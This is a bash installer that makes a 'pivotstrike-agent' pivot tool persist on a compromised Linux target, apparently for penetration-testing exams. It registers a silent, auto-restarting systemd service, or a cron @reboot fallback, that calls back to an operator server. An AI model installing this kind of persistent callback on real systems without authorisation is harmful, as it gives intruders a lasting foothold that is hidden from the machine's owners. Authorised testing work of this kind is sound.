#!/bin/bash
# install-agent.sh — Install the pivotstrike-agent as a persistent service on Linux.
#
# Usage (on the target, after transferring the agent binary):
#   sudo ./install-agent.sh <server-ip:port> <pin> [token]
#
# Creates a systemd service (or cron @reboot fallback) that auto-starts the
# agent on boot and auto-restarts it if it dies. During an exam, this means
# a target reboot (or a process crash from an OOM-killer, etc.) does NOT
# kill your pivot — it comes back automatically.
#
# To uninstall: sudo ./install-agent.sh --uninstall
set -euo pipefail

AGENT_PATH="/usr/local/bin/pivotstrike-agent"
SERVICE_NAME="pivotstrike-agent"

if [ "${1:-}" = "--uninstall" ]; then
    echo "Removing pivotstrike-agent service..."
    systemctl stop "$SERVICE_NAME" 2>/dev/null || true
    systemctl disable "$SERVICE_NAME" 2>/dev/null || true
    rm -f "/etc/systemd/system/${SERVICE_NAME}.service"
    systemctl daemon-reload 2>/dev/null || true
    crontab -l 2>/dev/null | grep -v pivotstrike-agent | crontab - 2>/dev/null || true
    rm -f "$AGENT_PATH"
    echo "Done."
    exit 0
fi

if [ "$#" -lt 2 ]; then
    echo "Usage: $0 <server-ip:port> <cert-pin> [join-token]"
    echo "       $0 --uninstall"
    exit 1
fi

SERVER="$1"
PIN="$2"
TOKEN="${3:-}"

# Find the agent binary
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
AGENT_SRC=""
for candidate in \
    "${SCRIPT_DIR}/pivotstrike-agent" \
    "${SCRIPT_DIR}/../dist/pivotstrike-agent" \
    "${SCRIPT_DIR}/../pivotstrike-agent" \
    "./pivotstrike-agent"; do
    if [ -f "$candidate" ]; then
        AGENT_SRC="$candidate"
        break
    fi
done

if [ -z "$AGENT_SRC" ]; then
    echo "Cannot find pivotstrike-agent binary. Place it next to this script or in ./dist/"
    exit 1
fi

# Install binary
cp "$AGENT_SRC" "$AGENT_PATH"
chmod +x "$AGENT_PATH"

# Build the command line
ARGS="-connect $SERVER -pin $PIN"
if [ -n "$TOKEN" ]; then
    ARGS="$ARGS -token $TOKEN"
fi

# Try systemd first (most modern Linux)
if command -v systemctl &>/dev/null; then
    cat > "/etc/systemd/system/${SERVICE_NAME}.service" << UNIT
[Unit]
Description=Pivot Agent
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
ExecStart=$AGENT_PATH $ARGS
Restart=always
RestartSec=5
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
UNIT
    systemctl daemon-reload
    systemctl enable "$SERVICE_NAME"
    systemctl start "$SERVICE_NAME"
    echo "Installed as systemd service. Status: systemctl status $SERVICE_NAME"
else
    # Fallback: cron @reboot
    CRON_CMD="@reboot nohup $AGENT_PATH $ARGS >/dev/null 2>&1 &"
    (crontab -l 2>/dev/null | grep -v pivotstrike-agent; echo "$CRON_CMD") | crontab -
    # Start now
    nohup "$AGENT_PATH" $ARGS >/dev/null 2>&1 &
    echo "Installed via cron @reboot (no systemd). Agent started (PID: $!)."
fi
